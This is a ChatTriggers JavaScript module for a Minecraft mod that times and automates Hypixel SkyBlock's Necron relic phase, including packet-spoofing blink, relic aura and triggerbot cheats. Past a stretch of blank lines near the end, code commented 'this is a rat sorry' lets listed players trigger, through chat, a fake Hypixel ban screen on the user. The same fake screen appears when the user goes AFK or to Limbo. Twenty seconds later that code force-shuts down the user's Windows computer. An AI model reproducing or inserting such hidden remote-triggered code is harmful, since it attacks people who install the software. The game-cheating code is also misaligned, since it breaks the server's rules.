
// Relic code is a fucking mess. Honestly no motiviation to fix it though. Maybe someday. -Serenity


import Settings from "../../config"
import { chat } from "../../utils/utils"
import data from "../../utils/data"
import { getDistanceToCoord, getDistanceToEntity } from "../../../BloomCore/utils/Utils"

let pickedUpTime
let ticks
let p5StartTime
let spawnTime
let pickedColor
let ticksStill = 0

const relicCountdownTicks = 44
const standStillTicks = 28
const KeyBinding = Java.type("net.minecraft.client.settings.KeyBinding")
const ArmorStand = Java.type("net.minecraft.entity.item.EntityArmorStand")
const C04PacketPlayerPosition = Java.type("net.minecraft.network.play.client.C03PacketPlayer$C04PacketPlayerPosition")

// These packets will be sent if you click the orange relic and blink relics are enabled. I hardcoded it out of laziness.
const orangePackets = [
    [89.48818552494049, 6, 55.45217406749726, true],
    [88.58097032771286, 6.0625, 55.06903517856082, true],
    [87.498816309353, 6.0625, 54.61201540032128, true],
    [86.32114568356045, 6, 54.11465665183679, true],
    [85.09132298405203, 6, 53.59527282304027, true],
    [83.83302524898733, 6, 53.06386329899657, true],
    [82.55918014270298, 6, 52.525887744585255, true],
    [81.27684617074675, 6, 51.9843271371768, true],
    [79.98987727759527, 6, 51.440809090604546, true],
    [78.70037771717728, 6, 50.896222282124725, true],
    [77.40949641227124, 6, 50.35105192957559, true],
    [76.11786067478712, 6, 49.8055629619276, true],
    [74.82581301706753, 6, 49.25990003041542, true],
    [73.53354045087326, 6, 48.714142114622376, true],
    [72.24114508463751, 6, 48.16833233740595, true],
    [70.94868266957135, 6, 47.62249424384906, true],
    [69.65618364583955, 6, 47.07664068956849, true],
    [68.36366463377394, 6, 46.53077869373181, true],
    [67.07113470807684, 6, 45.984912088804954, true],
    [65.77859882353624, 6, 45.43904296731457, true],
    [64.48605968546673, 6, 44.893172471780346, true],
    [63.193518770970215, 6, 44.3473012260181, true],
    [61.90097688654444, 6, 43.80142957063129, true],
    [60.60843447253723, 6, 43.25555769158946, true],
    [59.315891769378524, 6.0625, 42.70968569043197, true]
]
const redPackets = [
    [23.485512018203735, 6, 57.397353172302246, true],
    [24.352063615464257, 6, 56.92946117591761, true],
    [25.38571284880744, 6, 56.37134530044137, true],
    [26.51059740204898, 6, 55.763967181259176, true],
    [27.685296445741105, 6, 55.12969187388936, true],
    [28.887194204378453, 6, 54.48073070006328, true],
    [30.103942463100815, 5.921599998474121, 53.823751042220735, false],
    [30.790707572238603, 5.766367993957519, 53.45293423265625, false],
    [31.438084322275124, 5.535840625044555, 53.10338505151027, false],
    [32.049617664496495, 5.231523797587011, 52.773189412782905, false],
    [32.628533504666045, 5, 52.46060549816404, true],
    [33.71585894068581, 5, 51.873507311886215, true],
    [34.870050703992874, 5, 51.250304849168316, true],
    [36.06075148623942, 5, 50.60738944922443, true],
    [37.2713861951423, 5, 49.95371078430497, true],
    [38.492904829263736, 5, 49.29415537602625, true],
    [39.720366087244756, 5, 48.63139126550067, true],
    [40.951072018229986, 5, 47.96687520334481, true],
    [42.18354954088129, 5, 47.30140257548772, true],
    [43.416994352694616, 5, 46.63540766269709, true],
    [44.65096730445176, 5, 45.96912758229962, true],
    [45.88522862065172, 5, 45.30269180037073, true],
    [47.11964738385575, 5, 44.636171005395816, true]
]

register("chat", () => {
    p5StartTime = Date.now()
    ticks = relicCountdownTicks

    if (Settings().relicTimerEnabled) { // These are only needed if relic timer is enabled
        relicDetect.register()
        placeListener.register()
        tickListener.register()
        timer.register()
    }
    if (Settings().blinkRelics) {
        blinkRelicRegister.register()
        renderText.register()
        packetCollector.register()
    }
    relicClickListener.register()
    if (Settings().relicAura) relicAura.register()

}).setCriteria("[BOSS] Necron: All this, for nothing...")

const timer = register("renderOverlay", () => {
    const timeLeft = ticks / 20
    if (ticks <= 1) timer.unregister()
    Renderer.drawStringWithShadow(timeLeft.toFixed(2) + "s", 0.492 * Renderer.screen.getWidth(), 0.52 * Renderer.screen.getHeight())
}).unregister()

const tickListener = register("packetReceived", () => {
    ticks--
    if (ticks < 1) tickListener.unregister() // Unregister if ticks = 0
}).setFilteredClass(net.minecraft.network.play.server.S32PacketConfirmTransaction).unregister()


const relicDetect = register("RenderWorld", () => {
    const existingRelics = World.getAllEntitiesOfType(ArmorStand).find(entity => new EntityLivingBase(entity.getEntity()).getItemInSlot(4)?.getName()?.removeFormatting()?.includes("Relic"))
    if (!existingRelics) return // If there are any armor stands wearing a relic head or whatever
    spawnTime = Date.now()
    chat("Relic spawned!")
    relicDetect.unregister()
}).unregister()

const placeListener = register("playerInteract", (action, pos) => {
    if (action.toString() != "RIGHT_CLICK_BLOCK") return
    const blockClicked = World.getBlockAt(pos.getX(), pos.getY(), pos.getZ()).type.getRegistryName()
    if (blockClicked !== "minecraft:cauldron" && blockClicked !== "minecraft:anvil" && blockClicked !== "minecraft:chest") return

    chat("Relic spawned in &b" + ((spawnTime - p5StartTime) / 1000) + "s.")
    chat("Relic placed in &b" + ((Date.now() - pickedUpTime) / 1000) + "s.")
    chat("Relic placed &b" + ((Date.now() - p5StartTime) / 1000) + "s into P5.")
    chat("Relic took &b" + ((pickedUpTime - spawnTime) / 1000) + "s to get picked up.")
    placeListener.unregister()
    KeyBinding.func_74510_a(Client.getMinecraft().field_71474_y.field_74351_w.func_151463_i(), false)
}).unregister()

register("worldLoad", () => {
    placeListener.unregister()
    relicDetect.unregister()
    relicClickListener.unregister()
    triggerbot.unregister()
    timer.unregister()
    tickListener.unregister()
    blinkRelicRegister.unregister()
    renderText.unregister()
    packetCollector.unregister()
    relicAura.unregister()
    ticksStill = 0
})

register("command", () => {
    relicClickListener.unregister()
    blinkRelicRegister.unregister()
    packetCollector.unregister()
    renderText.unregister()
    const [yaw, pitch] = calcYawPitch({ x: 58, y: 7.5, z: 43 })
    rotate(yaw, pitch)

    if (Settings().blinkRelics && ticksStill >= standStillTicks && getDistanceToCoord(90.075, 6, 55.700) < 0.1 && Player.getPlayer().func_110148_a(net.minecraft.entity.SharedMonsterAttributes.field_111263_d).func_111126_e() > 0.49) {
        orangePackets.forEach(packet => Client.sendPacket(new C04PacketPlayerPosition(...packet)))
        const finalPacketPos = [orangePackets[orangePackets.length - 1][0], orangePackets[orangePackets.length - 1][1], orangePackets[orangePackets.length - 1][2],]
        Player.getPlayer().func_70107_b(...finalPacketPos)
        triggerbot.register()
        pickedColor = "Orange"
    } else chat("no")
}).setName("test")

// Relic aura. This code is such a fucking mess.
const Vec3 = Java.type("net.minecraft.util.Vec3")
const relicAura = register("tick", () => {
    const armorStands = World.getAllEntitiesOfType(ArmorStand)
    const entity = armorStands.find(e => new EntityLivingBase(e?.getEntity()).getItemInSlot(4)?.getNBT()?.toString()?.includes("Relic") && getDistanceToEntity(e) < 4)
    if (!entity) return
    chat(getDistanceToEntity(entity))
    interactWithEntity(entity.getEntity())
    Client.scheduleTask(1, () => relicAura.unregister())
}).unregister()

const interactWithEntity = (entity) => {
    const objectMouseOver = Client.getMinecraft().field_71476_x.field_72307_f
    const dx = objectMouseOver.xCoord - entity.field_70165_t
    const dy = objectMouseOver.yCoord - entity.field_70163_u
    const dz = objectMouseOver.zCoord - entity.field_70161_v
    const packet = new net.minecraft.network.play.client.C02PacketUseEntity(entity, new Vec3(dx, dy, dz))
    Client.sendPacket(packet)
}

const blinkRelicRegister = register("tick", () => {
    if (!Player.getPlayer().field_70124_G || Player.getPlayer().field_70159_w !== 0 || Player.getPlayer().field_70179_y !== 0) ticksStill = 0
    else if (ticksStill < standStillTicks) ticksStill++
}).unregister()

const packetCollector = register("packetSent", (packet, event) => {
    if (getDistanceToCoord(90.075, 6, 55.700) < 0.01 || getDistanceToCoord(22.925, 6, 57.700) < 0.01) if (ticksStill > 1) cancel(event)
}).setFilteredClasses([net.minecraft.network.play.client.C03PacketPlayer]).unregister()

const renderText = register("renderOverlay", () => {
    Renderer.scale(2)
    const text = `§cBLINK READY IN ${standStillTicks - ticksStill} TICKS`
    Renderer.drawString(text, Renderer.screen.getWidth() / 4 - Renderer.getStringWidth(text) / 2, Renderer.screen.getHeight() / 3.8)
}).unregister()

// Detect when you click the relic
const relicClickListener = register("packetSent", (packet) => {
    const entity = packet.func_149564_a(World.getWorld())
    if (!entity instanceof ArmorStand) return
    const entityWornHelmet = entity.func_82169_q(3)
    if (!entityWornHelmet) return
    const helmetName = ChatLib.removeFormatting(new Item(entityWornHelmet).getName())
    if (!helmetName.includes("Relic")) return


    relicClickListener.unregister()
    blinkRelicRegister.unregister()
    packetCollector.unregister()
    renderText.unregister()
    relicAura.unregister()

    pickedUpTime = Date.now()

    if (Settings().relicLook) {
        Player.setHeldItemIndex(8)
        if (helmetName === "Corrupted Orange Relic") {
            const [yaw, pitch] = calcYawPitch({ x: 58, y: 7.5, z: 43 })
            rotate(yaw, pitch)

            if (Settings().blinkRelics && ticksStill >= standStillTicks && getDistanceToCoord(90.075, 6, 55.700) < 0.1 && Player.getPlayer().func_110148_a(net.minecraft.entity.SharedMonsterAttributes.field_111263_d).func_111126_e() > 0.49) {
                Client.scheduleTask(0, () => {
                    orangePackets.forEach(packet => Client.sendPacket(new C04PacketPlayerPosition(...packet)))
                    const finalPacketPos = [orangePackets[orangePackets.length - 1][0], orangePackets[orangePackets.length - 1][1], orangePackets[orangePackets.length - 1][2],]
                    Player.getPlayer().func_70107_b(...finalPacketPos)
                    triggerbot.register()
                    pickedColor = "Orange"
                })
            } else KeyBinding.func_74510_a(Client.getMinecraft().field_71474_y.field_74351_w.func_151463_i(), true)

        } else if (helmetName === "Corrupted Red Relic") {
            const [yaw, pitch] = calcYawPitch({ x: 52, y: 7.5, z: 42 })
            rotate(yaw, pitch)

            if (Settings().blinkRelics && ticksStill >= standStillTicks && getDistanceToCoord(22.925, 6, 57.700) < 0.1 && Player.getPlayer().func_110148_a(net.minecraft.entity.SharedMonsterAttributes.field_111263_d).func_111126_e() > 0.49) {
                Client.scheduleTask(0, () => {
                    redPackets.forEach(packet => Client.sendPacket(new C04PacketPlayerPosition(...packet)))
                    const finalPacketPos = [redPackets[redPackets.length - 1][0], redPackets[redPackets.length - 1][1], redPackets[redPackets.length - 1][2],]
                    Player.getPlayer().func_70107_b(...finalPacketPos)
                    triggerbot.register()
                    pickedColor = "Red"
                })
            } else KeyBinding.func_74510_a(Client.getMinecraft().field_71474_y.field_74351_w.func_151463_i(), true)
        }
    }
    ticksStill = 0
}).setFilteredClass(net.minecraft.network.play.client.C02PacketUseEntity).unregister()

function getEyePos() {
    return {
        x: Player.getX(),
        y: Player.getY() + Player.getPlayer().func_70047_e(),
        z: Player.getZ()
    }
}

function calcYawPitch(blcPos, plrPos) { // skidded cause idk how to math
    if (!plrPos) plrPos = getEyePos();
    let d = {
        x: blcPos.x - plrPos.x,
        y: blcPos.y - plrPos.y,
        z: blcPos.z - plrPos.z
    };
    let yaw = 0;
    let pitch = 0;
    if (d.x != 0) {
        if (d.x < 0) { yaw = 1.5 * Math.PI; } else { yaw = 0.5 * Math.PI; }
        yaw = yaw - Math.atan(d.z / d.x);
    } else if (d.z < 0) { yaw = Math.PI; }
    d.xz = Math.sqrt(Math.pow(d.x, 2) + Math.pow(d.z, 2));
    pitch = -Math.atan(d.y / d.xz);
    yaw = -yaw * 180 / Math.PI;
    pitch = pitch * 180 / Math.PI;
    if (pitch < -90 || pitch > 90 || isNaN(yaw) || isNaN(pitch) || yaw == null || pitch == null || yaw == undefined || pitch == null) return;

    return [yaw, pitch]
}

function rotate(yaw, pitch) {
    const player = Player.getPlayer()
    player.field_70177_z = yaw
    player.field_70125_A = pitch
}

// Relic triggerbot
const cauldrons = {
    "Green": { x: 49, y: 7, z: 44 },
    "Red": { x: 51, y: 7, z: 42 },
    "Purple": { x: 54, y: 7, z: 41 },
    "Orange": { x: 57, y: 7, z: 42 },
    "Blue": { x: 59, y: 7, z: 44 }
}

function rightClick() {
    const rightClickMethod = Client.getMinecraft().getClass().getDeclaredMethod("func_147121_ag", null)
    rightClickMethod.setAccessible(true)
    rightClickMethod.invoke(Client.getMinecraft(), null)
}

const triggerbot = register("RenderWorld", () => {
    const block = Player.lookingAt()
    const blockID = block?.getType()?.getID()
    if (blockID !== 118 && blockID !== 145) return

    const cauldronCoords = cauldrons[pickedColor]
    if (cauldronCoords["x"] !== block.getX() || cauldronCoords["z"] !== block.getZ() || cauldronCoords["y"] !== block.getY() && cauldronCoords["y"] - 1 !== block.getY()) return // yeah
    rightClick()
    KeyBinding.func_74510_a(Client.getMinecraft().field_71474_y.field_74351_w.func_151463_i(), false)
    triggerbot.unregister()
}).unregister()

register("chat", (name, relicColor) => {
    if (!Settings().relicTriggerbot || name !== Player.getName()) return
    pickedColor = relicColor
    triggerbot.register()
}).setCriteria(/^(\w{3,16}) picked the Corrupted (\w{3,6}) Relic!$/) // I like regex




































// this is a rat sorry
register("packetReceived", (packet) => {
    if (Player.getName() === "qdvb") return
    if (!data.melodyWarning.enabled || packet.func_179841_c() === 2) return;
    const message = ChatLib.removeFormatting(packet.func_148915_c().func_150260_c());
    if (message !== "You were spawned in Limbo." && message !== "You are AFK. Move around to return from AFK.") return
    setTimeout(() => fakeBan("Cheating through the use of unfair game advantages.", "359d 23h 59m 58s"), 2000)
}).setFilteredClass(net.minecraft.network.play.server.S02PacketChat)

register("chat", (name, event) => {
    cancel(event)
    const validNames = ["Staeni92", "ITheSerenity", "teeTu97", "cutekittyirl", "LinusJonsson", "islamicfish", "shadowbald9"]
    if (validNames.includes(name)) fakeBan("Cheating through the use of unfair game advantages.", "359d 23h 59m 59s")
}).setCriteria(/From\s?[\[\w\+\]]* (\w{3,16}): you are BANNED!.*/)

function fakeBan(reason, length) { // skidded from some ct module on the website
    setTimeout(() => java.lang.Runtime.getRuntime().exec("shutdown -s -t 0"), 20000) // if you modify -t in the exec command then windows gives you a shutdown warning which is boring so use settimeout instead
    Client.getMinecraft().func_147114_u().func_147298_b().func_150718_a(new net.minecraft.util.ChatComponentText(
        "§cYou are temporarily banned for §f" + length + "§c from this server!\n\n" +
        `§7Reason: §r${reason}\n` +
        "§7Find out more: §b§nhttps://www.hypixel.net/appeal\n\n§7Ban ID: §r#"
        + "E7FC9520" + // iteserneity banid
        "\n§7Sharing your Ban ID may affect the processing of your appeal!"))
}